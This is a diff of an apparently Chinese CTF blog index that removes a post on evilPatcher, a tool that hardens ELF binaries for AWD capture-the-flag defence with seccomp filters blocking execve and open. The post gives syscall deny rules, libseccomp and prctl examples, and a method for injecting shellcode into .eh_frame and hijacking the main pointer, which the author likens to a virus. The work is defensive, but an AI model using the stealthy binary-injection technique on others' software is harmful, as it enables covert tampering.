-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip2 install pathlib2</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>再次测试，没有报错即为成功安装pwntools<br><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/6eb7498347064c83860cc16fc7ab8666.png" alt="在这里插入图片描述"><br>后续也成功运行脚本<br><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/20dd9e5b66654dafbd78fddcf9b69605.png" alt="在这里插入图片描述"></p>
-<h2 id="番外："><a href="#番外：" class="headerlink" title="番外："></a>番外：</h2><p>一开始安装pip2的时候尝试了很多方法，各种乱七八糟的都试了一遍<br>搞着搞着，忽然发现pip -V命令报错了,pip2和pip3都无法使用</p>
-<blockquote>
-<p>ImportError: No module named pip._internal.cli.main</p>
-</blockquote>
-<p><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/8f11e0269dfa4870bf8503b342edf3bb.png" alt="在这里插入图片描述"><br><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/977e79eab4894e96a500b03437928e1e.png" alt="在这里插入图片描述"><br>一开始很慌，但是后面发现重新安装pip就好了<br><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/033da0e9c0c84ef6ac27c924de386e73.png" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/29/pwn%E9%80%9A%E9%98%B2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/06/29/pwn%E9%80%9A%E9%98%B2/" class="post-title-link" itemprop="url">pwn通防</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-06-29 20:27:27" itemprop="dateCreated datePublished" datetime="2023-06-29T20:27:27+08:00">2023-06-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-10 10:41:54" itemprop="dateModified" datetime="2023-08-10T10:41:54+08:00">2023-08-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/awd/" itemprop="url" rel="index"><span itemprop="name">awd</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>最初想法是想找到一种不影响程序本身运行，但是能够给程序禁用一些系统调用（<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=execve&spm=1001.2101.3001.7020">execve</a>、open等）来实现通防的方法。看了网上很多资料，感觉没有找到比较理想的解决方案，有一些是环境都搭不起来，有一些工具对文件本身内容改动太大了（加段），而awd中假如check的脚本是本地运行的话是有可能check文件修改字节数的。那就只能自己动手，丰衣足食了。</p>
-<h2 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h2><h3 id="github地址"><a href="#github地址" class="headerlink" title="github地址"></a>github地址</h3><p><a target="_blank" rel="noopener" href="https://github.com/[TTY](https://so.csdn.net/so/search?q=TTY&spm=1001.2101.3001.7020)-flag/evilPatcher">https://github.com/[TTY](https://so.csdn.net/so/search?q=TTY&amp;spm=1001.2101.3001.7020)-flag/evilPatcher</a></p>
-<p>觉得还可以的话给个star~</p>
-<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
-<li>修改的字节数少，0x100字节以下</li>
-<li>不修改文件头信息</li>
-<li>沙箱规则可以自己定义</li>
-<li>支持i386和amd64</li>
-<li>支持pie开启和未开启情况</li>
-</ul>
-<p>注：已在ubuntu16、18、20上测试过默认版本gcc编译出的程序，通过；暂不支持g++编译出的程序。</p>
-<h3 id="环境需求"><a href="#环境需求" class="headerlink" title="环境需求"></a>环境需求</h3><p> 运行需要依赖seccomps-tools和pwntools</p>
-<p> pwntools <a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a></p>
-<p> seccomps-tools <a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p>
-<h3 id="目录说明"><a href="#目录说明" class="headerlink" title="目录说明"></a>目录说明</h3><p><strong>sandboxs文件夹</strong></p>
-<p> sandboxs里面存放了禁用的规则，这里根据自己的需要进行修改和选择。</p>
-<p>实例（sandbox1.asm）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? dead : next</span><br><span class="line">A == execve ? dead : next</span><br><span class="line">A == open ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
-
-<p><strong>test文件夹</strong></p>
-<p> 执行<code>./complie.sh</code>生成四个可执行文件可供测试，分别是64&#x2F;32位和pie开启&#x2F;关闭的排列组合。</p>
-<p><img src="https://img-blog.csdnimg.cn/2f7fd37c13da4bc1905e183f4ce972a6.png#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="运行脚本命令"><a href="#运行脚本命令" class="headerlink" title="运行脚本命令"></a>运行脚本命令</h3><p> 第一个参数是想要patch的elf文件，第二个参数是沙箱规则文件，可以从sandboxs文件夹里选，假如想输出更多的中间过程可以在最后参数加上一个1。（已自动识别32位和64位）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage: python evil_patcher.py elfFile sandboxFile</span><br><span class="line">       python evil_patcher.py elfFile sandboxFile 1 (more detailed process message)</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
-
-<p><strong>运行</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/6e2bf6a2a07f4d2fa7a92576d13a6cae.png#pic_center" alt="在这里插入图片描述"></p>
-<p> 结果输出一个patch过后的文件，文件名为原来文件加上.patch后缀，再改回原来的名字就可以开开心心传到靶机上了。</p>
-<p><img src="https://img-blog.csdnimg.cn/73c22e1cd06c480f96f3dd1c144c9c34.png#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>验证</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/a512246a1c1f431e9ded2a9c0a88a84c.png#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="禁用系统调用的两种方式"><a href="#禁用系统调用的两种方式" class="headerlink" title="禁用系统调用的两种方式"></a>禁用系统调用的两种方式</h2><h3 id="1-seccomp库实现"><a href="#1-seccomp库实现" class="headerlink" title="1.seccomp库实现"></a>1.seccomp库实现</h3><p>这种方法需要安装一些库文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libseccomp-dev libseccomp2 seccomp</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>实例</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    <span class="type">char</span> * str = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;hello worldn&quot;</span>,<span class="number">12</span>);</span><br><span class="line">    syscall(<span class="number">59</span>,str,<span class="literal">NULL</span>,<span class="literal">NULL</span>);<span class="comment">//execve</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1234567891011121314</span></span><br></pre></td></tr></table></figure>
-
-<p> scmp_filter_ctx是过滤器的结构体</p>
-<p> seccomp_init对结构体进行初始化，若参数为SCMP_ACT_ALLOW，则过滤为黑名单模式；若为SCMP_ACT_KILL，则为白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的syscall。</p>
-<p> seccomp_rule_add用来添加一条规则，arg_cnt为0,表示我们直接限制execve,不管参数是什么，如果arg_cnt不为0,那arg_cnt表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截</p>
-<p> seccomp_load是应用过滤器,如果不调用seccomp_load则上面所有的过滤都不会生效</p>
-<p> 注意：编译的时候要在最后面加 -lseccomp</p>
-<p> 这该种方式实现的话会涉及到堆的操作，会留下堆使用痕迹，出题一般不用这种，假如栈题倒是可以用。正常用倒是方便，直接调库就行。</p>
-<p><img src="https://img-blog.csdnimg.cn/ec354898825445ccbff1ab187652c3f1.png#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="2-prctl实现"><a href="#2-prctl实现" class="headerlink" title="2.prctl实现"></a>2.prctl实现</h3><p>实例</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">4</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">0xc000003e</span>,<span class="number">0</span>,<span class="number">2</span>),</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334</span></span><br></pre></td></tr></table></figure>
-
-<p> 主要用到两个结构体sock_filter和sock_fprog，prog会作为参数传入prctl,这里禁用了execve，x64的情况下其系统调用号为59。</p>
-<p>效果图</p>
-<p><img src="https://img-blog.csdnimg.cn/6c69d1d4fc7f4de29e7219c2e2cf2bb5.png#pic_center" alt="在这里插入图片描述"></p>
-<p> ps：一种更快捷的方式是通过seccomp-tools，可以直接生成代码，不过得提前写好沙箱规则的文件，格式和sandboxs文件夹中的文件一样。</p>
-<p><img src="/../images/pwn%E9%80%9A%E9%98%B2/e84557fc8f934ac5bee5e2c5e92fd5da-168804182185113.png#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-修改-start代码块"><a href="#1-修改-start代码块" class="headerlink" title="1.修改_start代码块"></a>1.修改_start代码块</h3><p>ELF执行流程图</p>
-<p><img src="https://img-blog.csdnimg.cn/bfbaf575076944af83e2888646a5460f.png#pic_center" alt="在这里插入图片描述"></p>
-<p> 程序的入口默认情况下都是_start函数，这里主要就是调用了__libc_start_main。</p>
-<p>函数原型</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __libc_start_main(<span class="type">int</span> *(main) (<span class="type">int</span>, <span class="type">char</span> * *, <span class="type">char</span> * *), <span class="type">int</span> argc, <span class="type">char</span> * * ubp_av, <span class="type">void</span> (*init) (<span class="type">void</span>), <span class="type">void</span> (*fini) (<span class="type">void</span>), <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> (* stack_end));</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p> main函数的地址就是第一个参数，那么我们可以修改这个参数为我们提前布置好的代码的地址，然后最后再跳转回main去执行正常流程，类似于病毒？不过这里藏得更深一点，病毒一般会修改程序入口点。</p>
-<h4 id="32位情况"><a href="#32位情况" class="headerlink" title="32位情况"></a>32位情况</h4><p>pie未开启</p>
-<p> 情况比较简单，直接修改mov的第二个操作数为我们要跳转的地址就行。</p>
-<p><img src="https://img-blog.csdnimg.cn/395a516336784251b8d107cacb665680.png#pic_center" alt="在这里插入图片描述"></p>
-<p>pie开启</p>
-<p> 这里情况稍微特殊一点，<code>push ds:(main_ptr - 3FC4)[ebx]</code>指令长度为6个字节，<code>lea ecx, (unk_2060 - 3FC4h)[ebx];push ecx;</code>两条指令长度起来为7，所以后面的<code>call ___libc_start_main</code>指令其实往后移了一个字节，把<code>hlt</code>覆盖了。</p>
-<p><img src="https://img-blog.csdnimg.cn/1aaec8e99b0a4581a2621a0e8ff59522.png#pic_center" alt="在这里插入图片描述"></p>
-<h4 id="64位情况"><a href="#64位情况" class="headerlink" title="64位情况"></a>64位情况</h4><p> 64位情况比较简单，都是修改mov或者lea的第二个参数就行，因为64位情况下是通过寄存器来传递参数的。</p>
-<p>pie未开启</p>
-<p><img src="https://img-blog.csdnimg.cn/ed49394a6bae444984e3d7e935b65beb.png#pic_center" alt="在这里插入图片描述"></p>
-<p>pie开启</p>
-<p><img src="https://img-blog.csdnimg.cn/a9ab738106e24776958139ee0e1675c8.png#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="2-prctl汇编实现"><a href="#2-prctl汇编实现" class="headerlink" title="2.prctl汇编实现"></a>2.prctl汇编实现</h3><p> 我们需要实现的其实是以下两个函数完成的事情，只不过我们现在使用系统调用来完成。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
-
-<p> PR_SET_NO_NEW_PRIVS、PR_SET_SECCOMP、SECCOMP_MODE_FILTER这三个都是常数，那么只要解决prog和prctl系统调用汇编实现就行了。幸运的是pwntools对于系统调用汇编实现已经有了相应的模块，好耶，懒狗狂喜。</p>
-<p><img src="https://img-blog.csdnimg.cn/c88a1e9bd00d49e69263af2e5c945fb5.png#pic_center" alt="在这里插入图片描述"></p>
-<p> 对于sock_filter和sock_fprog两个结构体可以当一维数组来看就行了，无脑push进栈就行了，不过最后还是需要进行堆栈平衡操作的，主要怕程序结束的时候异常。</p>
-<p><strong>注入代码放在哪？</strong></p>
-<p><strong>.eh_frame节</strong></p>
-<p> 正常编译处理的程序一般都会包含这个节区，里面主要记载一些异常处理的信息，一般是只读权限的，但是加载到内存的时候是有可能和<code>.text</code>节在同一个页，具有执行权限（之后发现ubuntu18.04编译出来的是如下图，但ubuntu16.04编译出来的<code>.eh_frame</code>并没有和<code>.text</code>节在一个段里）</p>
-<p> 选择把shellcode注入到这个节上，这个节的长度也一般会&gt;0x100个字节。</p>
-<p> 实现代码如下，不同情况汇编代码稍有区别，但思路一致。</p>
-<p><img src="https://img-blog.csdnimg.cn/9c25e7f08148411e90e87fa4b319f7f6.png#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="3-修改段权限"><a href="#3-修改段权限" class="headerlink" title="3.修改段权限"></a>3.修改段权限</h3><p> 编译出的文件<code>.eh_frame</code>节对应的那个段不一定有可执行权限，和编译器版本相关，那么我们只需要把<code>.eh_frame</code>节对应的那个段加上可执行权限就行。</p>
-<p><img src="https://img-blog.csdnimg.cn/877799e989884d2f9236f7ae52cb9323.png#pic_center" alt="在这里插入图片描述"></p>
-<p> ps：假如想手动修改段权限可以用010Editor直接改，非常好用，学习ELF文件格式用它非常好用。</p>
-<p><img src="https://img-blog.csdnimg.cn/2a1abdb980d54092b68cc972363fdb48.png#pic_center" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1274,7 +1286,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">53</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
